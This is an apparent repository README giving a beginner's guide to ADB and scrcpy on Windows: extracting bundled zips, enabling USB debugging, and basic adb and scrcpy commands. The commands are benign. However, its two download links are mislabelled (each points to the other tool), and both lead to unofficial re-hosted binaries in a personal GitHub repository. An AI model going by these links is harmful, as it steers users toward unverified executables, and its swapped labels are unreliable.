#        ADB & SCRCPY (WINDOWS ONLY) — COMPLETE OFFLINE GUIDE        #
#                Clean • Beginner-Friendly • Self-Contained          #

-----------------------------
📦 1. WHAT’S INCLUDED

This repository contains everything needed to run ADB and Scrcpy on Windows
WITHOUT installing Android Studio or downloading anything externally.

Included (inside /downloads):

  • platform-tools-win.zip     → ADB + Fastboot (Windows)
  • scrcpy-win64-v3.1.zip      → Scrcpy (Windows 64-bit)

Direct links:

SCRCPY: https://github.com/firesab1265-hash/Android-adb-scrcpy-toolkit/raw/main/downloads/platform-tools-win.zip
  
Toolkit: https://github.com/firesab1265-hash/Android-adb-scrcpy-toolkit/raw/main/downloads/scrcpy-win64-v3.1.zip
------------------------------

🛠️ 2. INSTALLATION (WINDOWS)

STEP 1 — Extract Platform Tools
1. Open:   /downloads/platform-tools-win.zip
2. Extract to a simple location, such as:

       C:\Android\platform-tools\

3. Confirm you see:
       adb.exe
       fastboot.exe

STEP 2 — Extract Scrcpy
1. Open:   /downloads/scrcpy-win64-v3.1.zip
2. Extract to:

       C:\Android\scrcpy\

3. Confirm you see:
       scrcpy.exe

Done — installation complete.

🔧 3. PREPARE YOUR ANDROID DEVICE

Enable Developer Options
Settings → About phone/tablet  
Tap "Build number" seven times  
Enter your PIN  

Enable USB Debugging
Settings → System → Developer options → USB debugging  
✔ Enable it  
Connect Your Device
Plug in a good USB cable  
Approve the popup:

    “Allow USB debugging?”
    ✔ Always allow from this computer
    ✔ OK  

-----------------------------
🧪 4. TEST ADB CONNECTION

Open Command Prompt and run:

    cd C:\Android\platform-tools
    adb devices

EXPECTED RESULT:

    XXXXXXXXXXXX    device

If it shows "unauthorized":
  • Check your device for a popup  
  • Toggle USB debugging  

If nothing shows:
  • Try a new cable  
  • Enable File Transfer (MTP)  
  • Restart the device  
  • Restart ADB:

        adb kill-server
        adb start-server

-----------------------------
⚙️ 5. ESSENTIAL ADB COMMANDS

List devices:
    adb devices

Reboot device:
    adb reboot

Open shell:
    adb shell

Exit shell:
    exit

Install APK:
    adb install app.apk

Push file → Downloads:
    adb push file.txt /sdcard/Download/

Pull file ← Downloads:
    adb pull /sdcard/Download/file.txt .

(The “.” means “save to current folder”.)

-----------------------------
📺 6. SCRCPY BASICS (USB MIRRORING)

Run scrcpy:
    cd C:\Android\scrcpy
    scrcpy.exe

Fullscreen:
    scrcpy -f

Turn device screen off while mirroring:
    scrcpy --turn-screen-off

Improve quality:
    scrcpy --bit-rate 16M --max-size 1920

Show debug logs (if it closes instantly):
    scrcpy

-----------------------------
🚨 7. TROUBLESHOOTING

DEVICE NOT DETECTED:
  • Change USB cable  
  • Restart device  
  • Restart ADB:
        adb kill-server
        adb start-server

UNAUTHORIZED:
  • Toggle USB debugging  
  • Reconnect USB cable  
  • Clear authorization and retry  

SCRCPY CLOSES INSTANTLY:
  • Run "scrcpy" without double-clicking to view errors  

-----------------------------
🧾 8. QUICK CHEAT SHEET

    adb devices
    adb shell
    adb reboot
    adb install app.apk
    adb push file /sdcard/Download/
    adb pull /sdcard/Download/file .
    scrcpy
    scrcpy -f
    scrcpy --turn-screen-off

-----------------------------
🔥 9. fireLabs_AI

This toolkit is part of fireLabs_AI — a personal collection of tools,
and experiments I organize as an IT hobby developer using
AI-assisted development.

The tools in this repo are NOT created by me — they are publicly available.

More curated tools and experiments will be added as fireLabs_AI grows.
#                        END OF COMPLETE GUIDE                       #
